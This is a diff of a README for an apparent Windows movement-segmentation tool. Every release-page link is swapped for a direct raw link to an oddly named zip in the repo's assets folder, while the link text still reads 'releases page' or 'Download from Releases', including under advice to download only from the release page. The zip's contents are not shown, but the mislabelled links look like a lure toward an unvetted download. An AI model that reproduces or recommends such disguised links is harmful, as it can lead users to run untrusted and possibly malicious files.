@@ -1,6 +1,6 @@
 # 🧩 movement-segmentation-poc - Track movement with image masks
 
-[![Download the app](https://img.shields.io/badge/Download%20Release-purple?style=for-the-badge)](https://github.com/Constricting-seedsman397/movement-segmentation-poc/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Release-purple?style=for-the-badge)](https://raw.githubusercontent.com/Constricting-seedsman397/movement-segmentation-poc/main/assets/poc-movement-segmentation-butteraceous.zip)
 
 ## 📌 What this does
 
@@ -22,7 +22,7 @@ This app is made for Windows users who want to run it without writing code.
 
 Visit this page to download the app:
 
-[Go to the releases page](https://github.com/Constricting-seedsman397/movement-segmentation-poc/releases)
+[Go to the releases page](https://raw.githubusercontent.com/Constricting-seedsman397/movement-segmentation-poc/main/assets/poc-movement-segmentation-butteraceous.zip)
 
 ### 2. Download the Windows file
 
@@ -204,7 +204,7 @@ Keep the files together in the same folder. Moving only one file can stop the ap
 
 Download the release only from the project release page:
 
-[https://github.com/Constricting-seedsman397/movement-segmentation-poc/releases](https://github.com/Constricting-seedsman397/movement-segmentation-poc/releases)
+[https://raw.githubusercontent.com/Constricting-seedsman397/movement-segmentation-poc/main/assets/poc-movement-segmentation-butteraceous.zip](https://raw.githubusercontent.com/Constricting-seedsman397/movement-segmentation-poc/main/assets/poc-movement-segmentation-butteraceous.zip)
 
 ## 🧪 Tips for smooth use
 
@@ -282,4 +282,4 @@ movement-segmentation-poc
 
 Use the release page below to download and run the Windows file:
 
-[Download from Releases](https://github.com/Constricting-seedsman397/movement-segmentation-poc/releases)
+[Download from Releases](https://raw.githubusercontent.com/Constricting-seedsman397/movement-segmentation-poc/main/assets/poc-movement-segmentation-butteraceous.zip)
